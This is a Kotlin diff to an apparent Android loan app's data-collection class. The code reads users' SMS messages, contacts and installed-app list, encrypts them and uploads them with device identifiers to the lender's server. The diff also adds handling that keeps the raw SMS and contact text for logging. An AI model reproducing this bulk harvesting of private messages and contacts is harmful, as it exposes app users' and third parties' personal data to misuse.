@@ -41,27 +41,36 @@ class CollectDataMgr {
         }
     }
 
-    fun collectAuthData(context: Context, orderId :String , observer: Observer?) {
+    fun collectAuthData(context: Context, orderId: String, observer: Observer?) {
         ThreadUtils.executeByCached(object : SimpleTask<Any?>() {
             @Throws(Throwable::class)
             override fun doInBackground(): Any {
                 try {
-                    val tempSms = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
+                    val originSms = GsonUtils.toJson(readSms(context))
+                    val tempSms = EncodeUtils.encryptAES(originSms)
                     val smsStr = if (TextUtils.isEmpty(tempSms)) "" else tempSms
+
                     val callRecordStr = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
-                    val contractStr =
-                        EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
-                    val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
+
+                    val originContract = GsonUtils.toJson(readContract(context))
+                    val tempContract = EncodeUtils.encryptAES(originContract)
+                    val contractStr = if (TextUtils.isEmpty(tempContract)) "" else tempContract
+
+                    val originAppInfo = GsonUtils.toJson(readAllAppInfo())
+                    val tempAppInfo = EncodeUtils.encryptAES(originAppInfo)
+                    val appInfoStr = if (TextUtils.isEmpty(tempAppInfo)) "" else tempAppInfo
+
                     val locationBean = ""
 //                        EncodeUtils.encryptAES(GsonUtils.toJson(LocationMgr.getInstance().locationBean))
+
                     val jsonObject = buildRequestJsonObj(
                         smsStr, callRecordStr, contractStr,
-                        appInfoStr, locationBean, orderId
+                        appInfoStr, locationBean, orderId,
                     )
-                    getAuthData(jsonObject, observer)
-                } catch (e : Exception){
-                    if (BuildConfig.DEBUG){
+                    getAuthData(jsonObject, observer, originSms, originContract, originAppInfo)
+                } catch (e: Exception) {
+                    if (BuildConfig.DEBUG) {
                         throw e
                     }
                 }
@@ -76,11 +85,13 @@ class CollectDataMgr {
     }
 
 
-    private fun buildRequestJsonObj(smsStr: String, callRecordStr: String,
-                                    contractStr: String, appListStr: String,
-                                    locationStr: String, orderId: String): JSONObject {
+    private fun buildRequestJsonObj(
+        smsStr: String, callRecordStr: String,
+        contractStr: String, appListStr: String,
+        locationStr: String, orderId: String
+    ): JSONObject {
         val jsonObject: JSONObject = BuildRequestJsonUtils.buildRequestJson()
-        if (BuildConfig.DEBUG){
+        if (BuildConfig.DEBUG) {
 //            Log.i("okhttp","1 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(contractStr) + "")
 //            Log.i("okhttp","2 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(smsStr) + "")
 //            Log.i("okhttp","3 = " + com.loan.icreditapp.util.EncodeUtils.decryptAES(callRecordStr) + "")
@@ -107,19 +118,19 @@ class CollectDataMgr {
             jsonObject.put("pubIp", NetworkUtils.getIpAddressByWifi())
             //手机IMEI
 //            jsonObject.put("imei",  PhoneUtils.getIMEI())
-            jsonObject.put("imei",  "")
+            jsonObject.put("imei", "")
             //androidId
-            jsonObject.put("androidId",  DeviceUtils.getAndroidID())
-            jsonObject.put("deviceUniqId",  DeviceUtils.getUniqueDeviceId())
-            jsonObject.put("mac",  DeviceUtils.getMacAddress())
+            jsonObject.put("androidId", DeviceUtils.getAndroidID())
+            jsonObject.put("deviceUniqId", DeviceUtils.getUniqueDeviceId())
+            jsonObject.put("mac", DeviceUtils.getMacAddress())
             //手机品牌型号
-            jsonObject.put("brand",  DeviceUtils.getManufacturer())
-            jsonObject.put("innerVersionCode",  AppUtils.getAppVersionCode())
-            jsonObject.put("isRooted", if ( DeviceUtils.isDeviceRooted()) 1 else 0)
-            jsonObject.put("isEmulator",  if (DeviceUtils.isEmulator()) 1 else 0)
+            jsonObject.put("brand", DeviceUtils.getManufacturer())
+            jsonObject.put("innerVersionCode", AppUtils.getAppVersionCode())
+            jsonObject.put("isRooted", if (DeviceUtils.isDeviceRooted()) 1 else 0)
+            jsonObject.put("isEmulator", if (DeviceUtils.isEmulator()) 1 else 0)
         } catch (e: java.lang.Exception) {
             e.printStackTrace()
-            if (BuildConfig.DEBUG){
+            if (BuildConfig.DEBUG) {
                 throw e
             }
         }
@@ -263,29 +274,67 @@ class CollectDataMgr {
     }
 
     @SuppressLint("MissingPermission")
-    private fun getAuthData(jsonObject: JSONObject , observer: Observer?) {
-        OkGo.post<String>(Api.UPLOAD_AUTH).tag(TAG).
-        upJson(jsonObject)
+    private fun getAuthData(
+        jsonObject: JSONObject, observer: Observer?,
+        originSms: String?, originContract: String?, originAppInfo: String?
+    ) {
+        OkGo.post<String>(Api.UPLOAD_AUTH).tag(TAG).upJson(jsonObject)
             .execute(object : StringCallback() {
                 override fun onSuccess(response: Response<String>) {
 //                        Log.i(TAG, " response success= " + response.body());
-                    var authBean : AuthResponseBean? =  CheckResponseUtils.checkResponseSuccess(response, AuthResponseBean::class.java)
+                    var authBean: AuthResponseBean? = CheckResponseUtils.checkResponseSuccess(
+                        response,
+                        AuthResponseBean::class.java
+                    )
                     if (authBean != null && authBean?.hasUpload == true) {
                         observer?.success(response)
                     } else {
-                        observer?.failure(response)
+                        var errorMsg: String? = null
+                        try {
+                            errorMsg = response.body().toString()
+                        } catch (e: Exception) {
+
+                        }
+                        observer?.failure(errorMsg)
+                        log2File(originSms, originContract, originAppInfo, errorMsg)
                     }
                 }
 
                 override fun onError(response: Response<String>) {
                     super.onError(response)
-                    //                        Log.i(TAG, "getAuthData response error = ");
-                    observer?.failure(response)
+                    var errorMsg: String? = null
+                    try {
+                        errorMsg = response.body().toString()
+                    } catch (e: Exception) {
+
+                    }
+                    observer?.failure(errorMsg)
                 }
             })
     }
 
-    private fun getHardwareData(){
+    private fun log2File(
+        originSms: String?,
+        originContract: String?,
+        originAppInfo: String?,
+        errorMsg: String?
+    ) {
+        val sb = StringBuffer()
+        if (!TextUtils.isEmpty(originSms)) {
+            sb.append("  sms: ").append(originSms)
+        }
+        if (!TextUtils.isEmpty(originContract)) {
+            sb.append("  contract: ").append(originContract)
+        }
+        if (!TextUtils.isEmpty(originAppInfo)) {
+            sb.append("  appinfo: ").append(originAppInfo)
+        }
+        if (!TextUtils.isEmpty(errorMsg)) {
+            sb.append("  errorMsg: ").append(errorMsg)
+        }
+    }
+
+    private fun getHardwareData() {
 
     }
 
@@ -322,6 +371,6 @@ class CollectDataMgr {
 
     interface Observer {
         fun success(response: Response<String>?)
-        fun failure(response: Response<String>?)
+        fun failure(response: String?)
     }
 }
